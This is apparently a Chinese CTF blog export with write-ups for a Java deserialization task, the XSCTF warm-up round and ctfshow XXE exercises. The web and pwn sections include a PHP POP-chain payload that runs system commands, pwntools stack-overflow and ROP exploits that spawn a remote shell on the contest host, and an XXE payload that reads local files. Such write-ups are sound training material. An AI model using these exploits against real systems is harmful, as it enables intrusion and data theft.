host = &quot;http://aafc6475-042c-4bf7-827e-4f577bb2838d.node4.buuoj.cn:81/&quot;

class myThread (threading.Thread):
    def __init__(self, name):
        threading.Thread.__init__(self)
        self.name = name
    def run(self):
        print (&quot;开始线程：&quot; + self.name)
        runing(self.name)
        print (&quot;退出线程：&quot; + self.name)

def runing(name):
   while True:
    r = requests.get(host+&quot;/evi1?name=%s&quot; % name)
    r.encoding = &quot;utf-8&quot;
    if r.text.find(&quot;The Key is&quot;)!=-1:
    	print(r.text)
    	return 0

# 创建新线程
thread1 = myThread(&quot;asdqwer&quot;)
thread2 = myThread(&quot;vnctf2022&quot;)

# 开启新线程
thread1.start()
thread2.start()
thread1.join()
thread2.join()</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/4bcc47c6b9aead7729d39f210bd2c637.png?x-oss-process=hzy" alt="image-20220314213034641"></p>
<p>然后就是要满足this.user.equals(u) 直接序列化一个就行。</p>
<pre><code class="hljs plaintext">package Payload;

import entity.User;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;
import util.SerAndDe;

public class Ser &#123;
    public static void main(String[] args) throws IOException &#123;
        User user = new User(&quot;m4n_q1u_666&quot;,&quot;666&quot;,&quot;180&quot;);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(user);

        byte[] ser = bos.toByteArray();
        Base64.Encoder encoder = Base64.getEncoder();
        String encodedText = encoder.encodeToString(ser);
        System.out.println(encodedText);
        User user2 = (User) SerAndDe.deserialize(ser);
        System.out.println(user2);
    &#125;
&#125;</code></pre>
<p>最后提交key和生成的<a href="https://so.csdn.net/so/search?q=base64&amp;spm=1001.2101.3001.7020">base64</a>就可以得到flag！</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>XSCTF联合招新赛（热身赛）</title>
    <url>/2022/10/21/XSCTF%20%E8%81%94%E5%90%88%E6%8B%9B%E6%96%B0%E8%B5%9B(%E7%83%AD%E8%BA%AB%E8%B5%9B%EF%BC%89/</url>
    <content><![CDATA[<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210212101670.png?x-oss-process=hzy" alt="image-20221021205911855"></p>
<span id="more"></span>
<hr>
<h1 id="xsctf-联合招新赛热身赛">XSCTF 联合招新赛（热身赛）</h1>
<h1 id="前言">前言</h1>
<p>三天，15名，菜菜菜！！！</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210212059176.png?x-oss-process=hzy" alt="image-20221021205911855"></p>
<h1 id="misc">MISC</h1>
<h2 id="b45364">B45364</h2>
<blockquote>
<p>WVVoT2FtUkhXamRoUmxVeFRtcHNUMXBHT1V4aFYyeDVXVmRHUTJKSGVGTlpXREJMQ2c9PQo=</p>
</blockquote>
<p>解码几次得到flag</p>
<p>hsctf{hU569Nd_KiiraaBllRa}</p>
<h2 id="phone_call">phone_call</h2>
<blockquote>
<p>陈队给你打了个电话，让你永远要相信Ta。</p>
</blockquote>
<p>俩个附件</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210181737151.png?x-oss-process=hzy" alt="image-20221018173635634"></p>
<p>浅浅听了一下，发现音频是九键手机按键音，直接DTMF工具识别</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210181759136.png?x-oss-process=hzy" alt="image-20221018175905054"></p>
<p>133562619159396</p>
<p>解压得到flag</p>
<p>flag = ‘HSCTF{Y0ong_Yu4n_X1an9_X1n_Ch3n_Du!}’</p>
<h2 id="鸠-打-电-话">鸠 打 电 话</h2>
<blockquote>
<p>鸠在给可恶的出题人打电话控诉题目太折磨，但由于出题人电话实在太太太难记了打了整整四遍才打对电话。</p>
<p>这个可恶的出题人居然还把电话拿来加密flag的压缩包了！罪大恶极！！！</p>
<p>Clue 1：BV1z64y1S7SR</p>
<p>Clue 2：最长的那段才是打通了的电话</p>
</blockquote>
<p>什么鬼话，理解不了，手机号直接爆破算了</p>
<p>五分钟，，waiting。。。。。。</p>
<h2 id="阳间题">阳间题</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210191904589.png?x-oss-process=hzy" alt="image-20221019190354125"></p>
<pre><code class="hljs plaintext">3207357975641587136122466514425152961654613410728337142271750273124995105747053991640817066352343657398947248938255086358418100814441196784643527787764297</code></pre>
<p>好吧，其实是这样的，010打开中文因为编码问题显示异常</p>
<pre><code class="hljs plaintext">艾尔登法环正式发售在即，迫不及待的mjj身上好像有蚂蚁在爬，写下了一句谜语：
3207357975641587136122466514425152961654613410728337142271750273124995105747053991640817066352343657398947248938255086358418100814441196784643527787764297
谜底就是flag，也是他给所有新生的祝福，希望大家享受解码的过程。</code></pre>
<p>十进制转十六进制再转str</p>
<pre><code class="hljs plaintext">====Q6BGST3OHYFM7CZATPBODT4CH2MN7CN6VZAOZ3XGHY4K7K5ADGNPESUCUIZI</code></pre>
<pre><code class="hljs plaintext">IZIUCUSEPNGDA5K7K4YHGX3ZOAZV6NC7NM2HC4TDOBPTAZC7MFYHO3TSGB6Q====</code></pre>
<p>逆序输出base32解码再凯撒爆破得到flag</p>
<pre><code class="hljs plaintext">FQARD&#123;L0u_W0s_yp3_4_k4qrcp_0d_apwnr0&#125;
HSCTF&#123;N0w_Y0u_ar3_4_m4ster_0f_crypt0&#125;</code></pre>
<h2 id="一个小彩蛋">一个小彩蛋！</h2>
<blockquote>
<p>听说只有聪明人才能看到这个彩蛋！</p>
<p>那能看到的你一定也是聪明人吧！</p>
<p>那聪明人一定已经拿到了Misc方向的B45364Reverse方向的2^11Crypto方向的二元一次方程组Web方向的头头是道PWN方向的babystack……的flag了吧！</p>
<p>那就来领取你的奖励吧！</p>
<p>把五个flag大括号包裹的内容按顺序相连最后塞进&quot;hsctf{}&quot;里就是这个彩蛋的flag哟~</p>
<p>（不会吧不会吧，不会这都有聪明人不知道要交hsctf{flag1+flag2+flag3+flag4+flag5}并且没有&quot;+&quot;的flag吧）</p>
</blockquote>
<p>hsctf{hU569Nd_KiiraaBllRaE1d3sTBrOth3r_CaR0IlikouleDl3F4TH3rRR4iin_AvAvAMast3rH0ssssT_dI@nQQBAdvV0mQn_QuE3nkun}</p>
<h2 id="image1">image1</h2>
<blockquote>
<p>图片隐写</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211715685.png?x-oss-process=hzy" alt="image-20221021171510619"></p>
<p>flag{d2c3e80c-7687-4aae-8f90-70e43df97b6f}</p>
<h2 id="image2">image2</h2>
<p>还是图片隐写，010打开即可</p>
<p>flag{5eafbba3-f710-4fcc-9045-0b0a8b581ec5}</p>
<h2 id="image3">image3</h2>
<p>修改宽高，还是打开010</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211731791.png?x-oss-process=hzy" alt="image-20221021173115701"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211731981.png?x-oss-process=hzy" alt="image-20221021173122802"></p>
<p>flag{2c44e767-e9b4-4b55-b75e-3504b515942f}</p>
<h2 id="image4">image4</h2>
<p>改成压缩包得到flag</p>
<p>flag{3f0283e0-e5d0-4084-816b-1237718a8630}</p>
<h1 id="web">WEB</h1>
<h2 id="头头是道">头头是道</h2>
<p>看header</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210181741704.png?x-oss-process=hzy" alt="image-20221018174133631"></p>
<p>hsctf{Mast3rH0ssssT_dI@nQQ}</p>
<h2 id="warm_up">warm_up</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210181742846.png?x-oss-process=hzy" alt="image-20221018174222722"></p>
<p>考察XFF</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210201323294.png?x-oss-process=hzy" alt="image-20221020132316151"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210201324481.png?x-oss-process=hzy" alt="image-20221020132430382"></p>
<p>Flag: hsctf{he1_hei_ran_r@n_w0_d3_rAn_Ran_00000000}</p>
<h2 id="ezser">ezser</h2>
<blockquote>
<p>魔术方法是什么东西捏？</p>
</blockquote>
<p>基础pop chain</p>
<p>exp如下</p>
<pre><code class="hljs plaintext">&lt;?php
class Fxizenta&#123;
    public $b;
    public function __call($method,$attributes)
    &#123;
        $this-&gt;sayhi();
    &#125;
    public function sayhi()
    &#123;
        echo &quot;It&#x27;s reversed! ctfer don&#x27;t need girlfriend&quot;.$this-&gt;b;
    &#125;

&#125;
class Need&#123;
    public $cmd ;
    public function __toString()
    &#123;
        return system($this-&gt;cmd);  //backdoor
    &#125;
&#125;

class girlfriend&#123;
    public $a;
    public function __destruct()
    &#123;
        $this-&gt;a-&gt;meeting();
    &#125;
&#125;

$h = new Fxizenta();
$z = new Need();
$z -&gt;cmd = &#x27;cat flag.php&#x27;;
$y = new girlfriend();
$y -&gt;a = $h;
$h -&gt;b = $z;

echo serialize($y);


?&gt;</code></pre>
<pre><code class="hljs plaintext">O:10:&quot;girlfriend&quot;:1:&#123;s:1:&quot;a&quot;;O:8:&quot;Fxizenta&quot;:1:&#123;s:1:&quot;b&quot;;O:4:&quot;Need&quot;:1:&#123;s:3:&quot;cmd&quot;;s:12:&quot;cat flag.php&quot;;&#125;&#125;&#125;</code></pre>
<p>flag在源码</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210182008773.png?x-oss-process=hzy" alt="image-20221018200857673"></p>
<p>flag{ctfer_d0nt_need_grilfriend}</p>
<h2 id="ezphp">EZphp</h2>
<blockquote>
<p>我得想想怎么才能取而代之</p>
</blockquote>
<p>题目如下</p>
<pre><code class="hljs plaintext">&lt;?php
include &#x27;flag.php&#x27;;
extract($_GET);
if (isset($wsf)) &#123;
    $xmm = trim(file_get_contents($zm));
    if ($xmm == $wsf) &#123;
        if (!empty($xlq)) &#123;
            $xw = trim(file_get_contents($fn));
            if ($xlq === $xw) &#123;

                echo &quot;&lt;p&gt;$flag&lt;/p&gt;&quot;;
            &#125; else &#123;
                echo &#x27;&lt;p&gt;no no no &lt;/p&gt;&#x27;;
            &#125;
        &#125; else &#x27;You cant do that!!&#x27;;
    &#125; else &#123;
        echo &#x27;hacker!!&#x27;;
    &#125;
&#125; else &#123;
    highlight_file(__FILE__);
&#125;
?&gt;</code></pre>
<p>考察了两个地方，第一个是变量覆盖，第二个就是伪协议读取</p>
<blockquote>
<p>extract() 函数从<a href="https://so.csdn.net/so/search?q=%E6%95%B0%E7%BB%84&amp;spm=1001.2101.3001.7020">数组</a>中将变量导入到当前的符号表。</p>
<p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p>
</blockquote>
<p>这道题目是两道原题合到一块了，那两道题目在这</p>
<p><a href="https://blog.csdn.net/qq_32642035/article/details/104747801">(68条消息) web8–php函数extract（）、file_get_contents（）、trim（）_line_uc的博客-CSDN博客_php的函数trim(file_get_contents($zm))</a></p>
<p><a href="https://blog.csdn.net/qq_42777804/article/details/90414002">(68条消息) bugku ctf 代码审计 extract变量覆盖_就是217的博客-CSDN博客_$content=trim(file_get_contents($file))</a></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211401428.png?x-oss-process=hzy" alt="image-20221021140113342"></p>
<p>flag{phP_lS_th9_be5T_l4ngUa9e}</p>
<h2 id="updater">updater</h2>
<blockquote>
<p>the fireware need to update now</p>
</blockquote>
<p>发现只能上传zip</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210201339867.png?x-oss-process=hzy" alt="image-20221020133928389"></p>
<p>上传之后放到uploads文件夹下，并且文件名随机hash</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210201340120.png?x-oss-process=hzy" alt="image-20221020134000028"></p>
<p>原题改的</p>
<p><a href="https://blog.csdn.net/AAAAAAAAAAAA66/article/details/121217024">(67条消息) i春秋-ctf 文件上传_AAAAAAAAAAAA66的博客-CSDN博客_ctf上传文件</a></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210201342096.png?x-oss-process=hzy" alt="image-20221020134205026"></p>
<p>apache具有解析漏洞</p>
<blockquote>
<p>apache解析漏洞即遇到无法解析的后缀名就会向前解析</p>
<p>eg:  h.php.aaa  会先解析aaa，无法解析后解析php</p>
<p>这样就可以绕过zip解压上传php文件了</p>
</blockquote>
<p>后面就是跟上面那个原题解法差不多了</p>
<p>…/…/…/…/1.php.abc</p>
<p>but试了不行，发现说的gorget the readme，<a href="http://xn--readme-vi6jl20hvfb348vi1m.md">软链接指向readme.md</a>,制作个压缩包</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211716794.png?x-oss-process=hzy" alt="image-20221021171643716"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211719594.png?x-oss-process=hzy" alt="image-20221021171947477"></p>
<p>上传之后得到</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211720155.png?x-oss-process=hzy" alt="image-20221021172055069"></p>
<p>hsctf{sP4ce.bi1ibiLi。Conn/672328O9a}</p>
<h2 id="babyxss">babyxss</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211701610.png?x-oss-process=hzy" alt="image-20221021170152095"></p>
<p>随便提交就会显示</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211702337.png?x-oss-process=hzy" alt="image-20221021170210236"></p>
<p>dir扫，发现其他路由—admin</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211703531.png?x-oss-process=hzy" alt="image-20221021170308422"></p>
<p>发现是一个可以实现查看提交的功能</p>
<p>提交了一个</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211705241.png?x-oss-process=hzy" alt="image-20221021170523155"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211705975.png?x-oss-process=hzy" alt="image-20221021170527886"></p>
<p>出不来flag，check前面的别人传的，发现是下面这样的</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210212033006.png?x-oss-process=hzy" alt="image-20221021203302881"></p>
<p>改一下ip和端口成自己的，然后提交之后check一下再一刷新就弹出来flag了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210212034581.png?x-oss-process=hzy" alt="image-20221021203438508"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210212034732.png?x-oss-process=hzy" alt="image-20221021203401659"></p>
<p>flag{b3cause_ba6y_u_arrre_so_beautiffffuuulll!!}</p>
<h2 id="easy_sql">easy_sql</h2>
<blockquote>
<p>嘉然，为了你我要打ctf！！！咦？这里这么注入不进去呢？奇怪</p>
</blockquote>
<p>sql注入，是个登录框</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211402159.png?x-oss-process=hzy" alt="image-20221021140229833"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211410965.png?x-oss-process=hzy" alt="image-20221021141049892"></p>
<p>访问robots.txt发现一个备份文件，但是文件名不全</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211411208.png?x-oss-process=hzy" alt="image-20221021141130145"></p>
<p>未出，没思路了，备份文件都下不来，脑洞了</p>
<h1 id="pwn">PWN</h1>
<h2 id="babystack">babystack</h2>
<blockquote>
<p>非常简单的栈溢出<br>
nc 43.248.98.206 10041</p>
</blockquote>
<p>信了就是简单的栈溢出</p>
<p>不过多说了，直接exp</p>
<pre><code class="hljs plaintext">from pwn import *
p = remote(&#x27;43.248.98.206&#x27;,10041)
#p = process(&quot;./babystack&quot;)
context.log_level = &#x27;debug&#x27;
payload = b&#x27;a&#x27;*20+p64(0x401195)
p.sendline(payload)
p.interactive()</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210181816411.png?x-oss-process=hzy" alt="image-20221018181605349"></p>
<p>hsctf{BAdvV0mQn_QuE3nkun}</p>
<h2 id="easyrop">easyrop</h2>
<p>rop</p>
<pre><code class="hljs plaintext">from pwn import *
#from LibcSearcher import *
context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)
r = remote(&quot;43.248.98.206&quot;,10046)
#r = process(&#x27;./rop&#x27;)
elf = ELF(&#x27;./rop&#x27;)


main=4007E3
scanf_plt = elf.plt[&#x27;__isoc99_scanf&#x27;]
PUTS_GOT = elf.got[&#x27;puts&#x27;]
RET = 0x004007D1
PUTS_PLT = elf.plt[&#x27;puts&#x27;]
MAIN_PLT = 0x4005F0
POP_RDI = 0x400873
pop_rsi_r15_ret = 0x0000000000400871
payload =  b&#x27;a&#x27;*(0x70+8)+ p64(POP_RDI) +p64(0x004008E9) + p64(pop_rsi_r15_ret) +p64(0x00601060+0x200)+p64(0)+p64(scanf_plt)+p64(RET)+p64(0x000000000400787)


r.sendline(payload)
r.sendline(b&#x27;/bin/sh;&#x27;)

payload =  b&#x27;a&#x27;*(0x70+8)+ p64(POP_RDI) +p64(0x00601060+0x200) +p64(RET)+ p64(elf.plt[&#x27;system&#x27;])

r.sendline(payload)
r.interactive()
</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210211335516.png?x-oss-process=hzy" alt="image-20221021133516416"></p>
<p>flag{6XqbzirmJmaSZdUP1egiCeoQ}</p>
<h2 id="送flag">送flag</h2>
<p>也是栈溢出，只不过保护机制多开了一个ELF随机地址</p>
<p>脚本如下</p>
<pre><code class="hljs plaintext">from pwn import *
context.log_level = &#x27;debug&#x27;
#p=process(&#x27;./song&#x27;)
p=remote(&#x27;43.248.98.206&#x27;,10050)
p.recvuntil(b&quot;:&quot;)
m=p.recv(14)
c=str(m, encoding=&quot;utf-8&quot;)
sys=int(c,16)-0x14
payload=b&#x27;a&#x27;*(0x40+8)+p64(sys)
p.sendline(payload)
p.interactive()</code></pre>
<p>hsctf{Z2l2ZXlvdWFmbGFn}</p>
<h1 id="crypto">CRYPTO</h1>
<h2 id="baigeirsa">baigeiRSA</h2>
<blockquote>
<p>白给了，白给了，真白给！</p>
</blockquote>
<p>题目如下</p>
<pre><code class="hljs plaintext">import libnum
from Crypto.Util import number
from secret import flag

size = 128
e = 65537
p = number.getPrime(size)
q = number.getPrime(size)
n = p*q

m = libnum.s2n(flag)
c = pow(m, e, n)

print(&#x27;n = %d&#x27; % n)
print(&#x27;c = %d&#x27; % c)
</code></pre>
<pre><code class="hljs plaintext">n = 88503001447845031603457048661635807319447136634748350130947825183012205093541
c = 40876621398366534035989065383910105526025410999058860023908252093679681817257
</code></pre>
<p>知道n，c，e，n不大直接yafu分解</p>
<p>得到</p>
<pre><code class="hljs plaintext">p=274539690398523616505159415195049044439
q=322368694010594584041053487661458382819</code></pre>
<p>剩下的就是一把梭了</p>
<pre><code class="hljs plaintext">#!/usr/bin/env python3
# coding:utf-8
#power by jedi

import gmpy2
import binascii


p = gmpy2.mpz(274539690398523616505159415195049044439)
q = gmpy2.mpz(322368694010594584041053487661458382819)
e = gmpy2.mpz(65537)
n=p*q
phi_n = (p-1)*(q-1)
d = gmpy2.invert(e, phi_n)
c = gmpy2.mpz(40876621398366534035989065383910105526025410999058860023908252093679681817257)

m = pow(c, d, n)
print(&quot;十进制:\n%s&quot;%m)
m_hex = hex(m)[2:]
print(&quot;十六进制:\n%s&quot;%(m_hex,))
#print(&quot;ascII:\n%s&quot;%((binascii.b2a_hex(hex(m)[2:])).decode(&#x27;hex&#x27;),))
print(&quot;ascii:\n%s&quot;%(binascii.a2b_hex(m_hex).decode(&quot;utf8&quot;),))
</code></pre>
<p>HSCTF{@Zh3n_Ba1_G3i!@}</p>
<h2 id="baigeirsa2">baigeiRSA2</h2>
<blockquote>
<p>既然白给，就多给一点吧！</p>
</blockquote>
<p>题目如下</p>
<pre><code class="hljs plaintext">import libnum
from Crypto.Util import number
from functools import reduce
from secret import flag

n = 5
size = 64
while True:
    ps = [number.getPrime(size) for _ in range(n)]
    if len(set(ps)) == n:
        break

e = 65537
n = reduce(lambda x, y: x*y, ps)
m = libnum.s2n(flag)
c = pow(m, e, n)

print(&#x27;n = %d&#x27; % n)
print(&#x27;c = %d&#x27; % c)
</code></pre>
<pre><code class="hljs plaintext">n = 175797137276517400024170861198192089021253920489351812147043687817076482376379806063372376015921
c = 144009221781172353636339988896910912047726260759108847257566019412382083853598735817869933202168
</code></pre>
<p>64位RSA算法，靠yafu分解出来五个值，没遇到过这种情况，暂且放这</p>
<pre><code class="hljs plaintext">P19 = 9401433281508038261
P20 = 10252499084912054759
P20 = 11855687732085186571
P20 = 11215197893925590897
P20 = 13716847112310466417</code></pre>
<p>exp</p>
<pre><code class="hljs plaintext">from Crypto.Util.number import *
from gmpy2 import *
n = 175797137276517400024170861198192089021253920489351812147043687817076482376379806063372376015921
c = 144009221781172353636339988896910912047726260759108847257566019412382083853598735817869933202168
e=65537
p=9401433281508038261
q=10252499084912054759
r3=11215197893925590897
r4=11855687732085186571
r5=13716847112310466417
d=invert(e,(p-1)*(q-1)*(r3-1)*(r4-1)*(r5-1))
m=pow(c,d,n)
print(long_to_bytes(m))
</code></pre>
<p>HSCTF{@Tv0_br3ad5_c1ip_cHe3se_!@}</p>
<h2 id="二元一次方程组">二元一次方程组</h2>
<p>题目如下</p>
<pre><code class="hljs plaintext">n = 5700102857084805454304483466349768960970728516788155745115335016563400814300152521175777999545445613444815936222559357974566843756936687078467221979584601
avg = 75635892913589759545076958131039534718834447688923830032758709253942408722875
c = 888629627089650993173073530112503758717074884215641346688043288414489462472394318700014742820213053802180975816089493243275025049174955385229062207064503</code></pre>
<pre><code class="hljs plaintext">import libnum
from Crypto.Util import number
from secret import flag


size = 256
e = 65537
p = number.getPrime(size)
q = number.getPrime(size)
avg = (p+q)/2
n = p*q

m = libnum.s2n(flag)
c = pow(m, e, n)

print(&#x27;n = %d&#x27; % n)
print(&#x27;avg = %d&#x27; % avg)
print(&#x27;c = %d&#x27; % c)
</code></pre>
<p>二元一次方程可以解出来p和q</p>
<pre><code class="hljs plaintext"># n =p*q
# avg = (p+q)/2
# n = 5700102857084805454304483466349768960970728516788155745115335016563400814300152521175777999545445613444815936222559357974566843756936687078467221979584601
# avg = 75635892913589759545076958131039534718834447688923830032758709253942408722875</code></pre>
<p>破脚本总之是出来得数了，大佬不喜勿喷</p>
<pre><code class="hljs plaintext">from sympy import *

#定义变量
p = Symbol(&#x27;p&#x27;)
q = Symbol(&#x27;q&#x27;)
print(solve([p*q-5700102857084805454304483466349768960970728516788155745115335016563400814300152521175777999545445613444815936222559357974566843756936687078467221979584601,(p+q)/2-75635892913589759545076958131039534718834447688923830032758709253942408722875],[p,q]))
#[(71087768052593510372666084538192216997254291933607002714885530754163087727843, 80184017774586008717487831723886852440414603444240657350631887753721729717907), (80184017774586008717487831723886852440414603444240657350631887753721729717907, 71087768052593510372666084538192216997254291933607002714885530754163087727843)]</code></pre>
<pre><code class="hljs plaintext">p=71087768052593510372666084538192216997254291933607002714885530754163087727843
q=80184017774586008717487831723886852440414603444240657350631887753721729717907
c = 888629627089650993173073530112503758717074884215641346688043288414489462472394318700014742820213053802180975816089493243275025049174955385229062207064503
n = 5700102857084805454304483466349768960970728516788155745115335016563400814300152521175777999545445613444815936222559357974566843756936687078467221979584601
e = 65537</code></pre>
<p>然后再用上边第一个rsa的脚本就可以了</p>
<p>hsctf{Dl3F4TH3rRR4iin_AvAvA}</p>
<h1 id="re">RE</h1>
<h2 id="211">2^11</h2>
<blockquote>
<p>在sage里又是什么意思呢……？</p>
</blockquote>
<p>主要逻辑如下</p>
<pre><code class="hljs plaintext">int __cdecl main(int argc, const char **argv, const char **envp)
&#123;
  int v3; // edx
  int v4; // ecx
  int v5; // eax
  int v7; // eax
  int v8; // eax
  int v9; // edx
  WORD v10; // bx
  HANDLE v11; // eax
  int v12; // eax

  __main();
  p = (unsigned int)malloc(1u);
  while ( i-- )
  &#123;
    v3 = -6 * i + 35;
    m[v3] = -1;
    v4 = 6 * i;
    m[v4] = m[v3];
    v5 = 35 - i;
    m[v5] = m[v4];
    m[i] = m[v5];
  &#125;
  srand(p);
  __mingw_free(p);
  while ( (air || can) &amp;&amp; c != 27 )
  &#123;
    if ( c == 65 || c == 87 )
    &#123;
      j = 30;
      i = 1;
      if ( c == 65 )
        v7 = -1;
      else
        v7 = -6;
      order(6, v7);
    &#125;
    if ( c == 68 || c == 83 )
    &#123;
      j = 6;
      i = -1;
      if ( c == 68 )
        v8 = 1;
      else
        v8 = 6;
      order(30, v8);
    &#125;
    if ( c == 81 )
      exit(0);
    if ( air )
    &#123;
      if ( !can )
      &#123;
        --air;
        if ( !system(&quot;cls&quot;) )
        &#123;
          do
            i = rand() % 30;
          while ( m[i] );
          if ( rand() % 5 )
            v9 = 1;
          else
            v9 = 2;
          m[i] = v9;
          p = (unsigned int)&amp;unk_408098;
          while ( 1 )
          &#123;
            p -= 4;
            if ( p - (_DWORD)m == 24 )
              break;
            if ( *(int *)p &lt; -1 )
              *(_DWORD *)p = -*(_DWORD *)p;
          &#125;
          while ( 1 )
          &#123;
            p += 4;
            if ( p - (_DWORD)m == 124 )
              break;
            v10 = bg[*(_DWORD *)p % 12 + 1];
            v11 = GetStdHandle(0xFFFFFFF5);
            SetConsoleTextAttribute(v11, v10);
            if ( *(_DWORD *)p != -1 &amp;&amp; (*(_DWORD *)p == *(_DWORD *)(p + 4) || *(_DWORD *)p == *(_DWORD *)(p + 24)) )
              ++can;
            if ( !(((int)(p - (_DWORD)m) &gt;&gt; 2) % 6) )
              _cputs(&quot;\n&quot;);
            if ( *(_DWORD *)p != -1 )
            &#123;
              if ( *(_DWORD *)p )
                v12 = 1 &lt;&lt; *(_DWORD *)p;
              else
                v12 = 0;
              _cprintf(&quot;%5d&quot;, v12);
            &#125;
          &#125;
          if ( !air &amp;&amp; !can )
          &#123;
            _cputs(&quot;Game over!&quot;);
            system(&quot;pause&quot;);
          &#125;
          _cprintf(&quot;W - up\nA - left\nS - down\nD - right\nQ - quit\n&quot;);
          _cprintf(&quot;score:%d\n&quot;, score);
          if ( score &gt; 2020 )
            secret();
        &#125;
      &#125;
    &#125;
    LOBYTE(c) = _getch() &amp; 0x5F;
    c = (unsigned __int8)c;
  &#125;
  return 0;
&#125;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210212128126.png?x-oss-process=hzy" alt="image-20221021212853054"></p>
<p>成绩达到2020就算成功，跟进secret函数</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210212129334.png?x-oss-process=hzy" alt="image-20221021212928267"></p>
<p>脚本如下</p>
<pre><code class="hljs plaintext">a = &#x27;H4ve_fun_w1th_R3verse_my_friend~&#x27;
b = &#x27;.X\x17\x02$#D\nl\x04e6\x1A\x10&amp;[E\x17-0\x04\r]03\x0F\x19\x06\x10\x02\x01\x03&#x27;
flag = &#x27;&#x27;
for i in range(32):
    flag += chr(ord(a[i]) ^ ord(b[i]))
print(flag)
</code></pre>
<p>flag{E1d3sTBrOth3r_CaR0Ilikoule}</p>
<h2 id="baigeixor">baigeiXOR</h2>
<blockquote>
<p>Tover嫌弃我出的题目太难了，于是抢了我的键盘出了这道白给题</p>
</blockquote>
<p>flag{b4igei_baig3il3_zhenba1ge1}</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE</title>
    <url>/2022/07/04/XXE/</url>
    <content><![CDATA[<p><strong>XXE刷题记录</strong></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207041801094.png?x-oss-process=hzy" alt="image-20220704180114042"></p>
<span id="more"></span>
<p>首先得先初步了解一下什么是xxe，推荐下面这个</p>
<p><a href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞</a></p>
<p><a href="https://www.cnblogs.com/backlion/p/9302528.html">XML与xxe注入基础知识</a></p>
<h1 id="web373有回显">web373（有回显）</h1>
<p>正常的xxe</p>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents(&#x27;php://input&#x27;);
if(isset($xmlfile))&#123;
    $dom = new DOMDocument();
    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $creds = simplexml_import_dom($dom);
    $ctfshow = $creds-&gt;ctfshow;
    echo $ctfshow;
&#125;
highlight_file(__FILE__);</code></pre>
<pre><code class="hljs plaintext">&lt;!DOCTYPE test [
&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;
]&gt;
&lt;yu22x&gt;
&lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;
&lt;/yu22x&gt;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/a5454363c363482bd0629229c7011320.png?x-oss-process=hzy" alt="image-20220416181444576"></p>
<h1 id="web374-376无回显">web374-376(无回显)</h1>
